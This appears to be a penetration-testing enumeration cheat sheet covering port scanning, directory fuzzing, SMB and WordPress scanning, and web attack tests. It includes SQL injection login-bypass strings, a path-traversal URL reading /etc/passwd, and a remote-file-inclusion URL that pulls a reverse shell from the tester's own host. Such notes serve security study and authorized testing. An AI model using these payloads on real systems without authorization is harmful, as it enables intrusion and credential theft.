# Table of Contents
- [nmap](#nmap)
- [netcat](#netcat)
- [Web Servers](#Web-Servers)
	- [robots.txt](####robots-txt)
	- [burp](#####burp)
	- [gobuster](####gobuster)
	- [SSL Certificates](####SSL-Certificates)
	- [Nikto](####Nikto)
	- [SQL Injection](####SQL-Injection)
	- [LFI](####LFI)
	- [RFI](####RFI)
	- [Default Credentials](####Default-Credentials)
	- [Source Code](####Source-Code)
	- [Headers/Cookies](####Headers/Cookies)
	- [wpscan](####wpscan)
	- [robots.txt](####robots-txt)
- [SMB](#SMB)
	- [smbmap](####smbmap)
	- [smbclient.py](####smbclient.py)
- [FTP](#FTP)
- [Database Services](#Database-Services)
- [Email Servers](#Email-Servvers)
- [Products/Version Numbers](#Products-Version-Numbers)

# nmap
To get the clearest picture of what ports are open on a target, perform a full port scan on every target with:

```
nmap -p- <TARGET>
```

nmap scans that target a smaller range of ports will often miss interesting ports, so it is crucial to run the full port scan.

To run a scan of the top 1,000 ports with detailed information about services and OS detection:
```
sudo nmap -sC -sV -sS -A <TARGET>
```

Sometimes, an interesting port can be listening on UDP. UDP scanning a target is not always easy. I've found the best scan for UDP is:
```
sudo nmap -sU --max-retries 0 <TARGET>
```

After running the above scans, you should have enough information to proceed with further enumeration on your target.

# netcat
If there is a strange service discovered, you can use netcat to connect to it to see if it reveals any further information with:
```
nc -nv <TARGET> <PORT>
```

# Web-Servers
It is very common to encounter web servers. The most popular are Apache (primarily Linux, but Windows can run it as well with XAMPP) and IIS (Windows). This is not a definitive list, and you may run in to other web server platforms.

Most of the time, web servers will either be listening for connections on port 80 (HTTP) or 443 (HTTPS). However, it is not uncommon to see web servers listening on ports such as 8080. It is crucial to look at the nmap output to ensure that you're not missing a web server that may be running on a non standard port.

#### robots-txt
Check for a /robots.txt file to see if there is one, and if it contains any interesting directories.

#### burp
The first thing you should do when you find a new web page is to run it through burp. Manipulate the pages and watch the requests/responses in burp for anything of interest that you could modify.

#### gobuster
There is often directories of interest that you can find by fuzzing the web server. admin login pages, directories that contain sensitive data, etc. can be found through directory fuzzing. It is important to always properly fuzz a web server and determine if there is anything that may be worth looking in to. gobuster is a common directory fuzzing tool used to perform this task.

Usually I start with the common wordlist as it contains the most popular directories and runs relatively quickly:
```
gobuster dir -u <TARGET> -w /usr/share/wordlists/dirb/common.txt -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp,aspx,jsp,cgi,pl,sh"
```

However, if nothing of interest is showing up from the common scan, there is a medium wordlist that is larger (and takes longer to run) that can be used:
```
gobuster dir -u <TARGET> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp,aspx,jsp,cgi,pl,sh"
```

It is important to note that gobuster is not recursive, meaning if it finds a directory, it will not scan for directories under the found directory. If you see a directory that is interesting and doesn't seem to have anything initially, rerun gobuster and add the directory to fuzz it further.

#### SSL-Certificates
If a web server is running on a secure port (443 or other), it will usually have an SSL certificate associated with it. Make sure to look at the nmap output to see if any additional hostnames that may be of interest are found.

#### Nikto
Another useful tool in enumerating web servers is nikto. It can find interesting directories and reveal detailed information about a server's configuration. You can run a nikto scan with the following command:

```
nikto -h <TARGET>
```

#### SQL-Injection
Any time there is an input field on a web page, whether it be a login page or something else, you should always try to test it for SQL injection. Usually you can test for SQL injection by simply entering a ' although sometimes more advanced methods are required. A good list of SQL injections to attempt is:

```
' or 1=1 LIMIT 1 --  
' or 1=1 LIMIT 1 -- -  
' or 1=1 LIMIT 1#  
'or 1#  
' or 1=1 --  
' or 1=1 -- -
```

#### LFI
Local File Inclusion is sometimes possible on web pages. They are most common, but not limited to, PHP based web sites.

Any time you see a PHP page like http://www.example.com/foo.php?bar=something, You should test it for both LFI and RFI. To test for LFI on Linux systems, you can usually try reading the /etc/password file with:

```
http://www.example.com/foo.php?bar=../../../../../etc/passwd
```

It is the same on Windows except you need to call a file present on Windows system:

```
http://www.example.com/foo.php?bar=../../../../../windows/system32/drivers/etc/hosts
```

The ../'s are not exact and may need to be experimented with until the LFI is found.

#### RFI
Testing for Remote File Inclusion is the same as LFI, except you insert a URL that you want to try to access. Normally you would attempt to call a reverse shell page you are hosting on a web server under your control:

```
http://www.example.com/foo.php?bar=<http://<YOUR-IP>/shell.php
```

#### Default-Credentials
If you encounter any login pages on a web site, you should try to login to them with commonly used credentials. While a full list would be too much to post here, some common credentials to try would be admin/admin, admin/password, etc.

#### Source-Code
Sometimes there is information hidden in the source code of the web page that is beneficial. You should always look at the source code of the web page and look for anything interesting.

#### Headers/Cookies
You should always look at the headers/cookies that a web site contains. Sometimes there are interesting values that reveal version information, credentials, etc. You can also sometimes set the value of a cookie to a value that will give you elevated permissions to a web page (if there is a cookie called isAdmin for example, if you can change it from false to true, you may be able to gain additional privileges on the site).

#### wpscan
If the web server is running WordPress, you should use wpscan against it to search for any vulnerabilities:
```
wpscan --url <http://ip> -e u,ap,at --plugins-detection aggressive
```

# SMB
Servers frequently have SMB ports open on them. SMB is a protocol used for accessing file shares. It shows up as microsoft-ds on Windows server and Samba on Linux servers.

#### smbmap
smbmap is a useful tool to enumerate SMB shares. It can be used to see what shares exist on a server, as well as your level of access to them. You can use it to test anonymous SMB access with the following command:

```
smbmap -H <TARGET> -u "" -p ""
```    

If you have credentials, you can use it to see what shares the account has access to with the following command:

```
smbmap -H <TARGET> -u "<USERNAME>" -p "<PASSWORD>"
```

#### smbclient.py
You can use smbclient.py to connect to the SMB server. If the server supports anonymous authentication, use the following command to connect:

```
python3 /usr/share/doc/python3-impacket/examples/smbclient.py <TARGET>
```

If you have credentials, use the following command and enter the password when prompted:

```
python3 /usr/share/doc/python3-impacket/examples/smbclient.py <USERNAME@TARGET>
```

# FTP
Check to see if you have anonymous access to any FTP directories.

# Database-Services
Database services are sometimes exposed and can potentially be exploited. You should research any database services found for any possible exploits.

# Email-Servers
If a server has an email server running on it, it is possible to enumerate the service for more information or possibly exploit it.

# Products-Version-Numbers
Make note of any product names/version numbers you find for any software. This can lead to the discovery of a vulnerability that can be exploited.





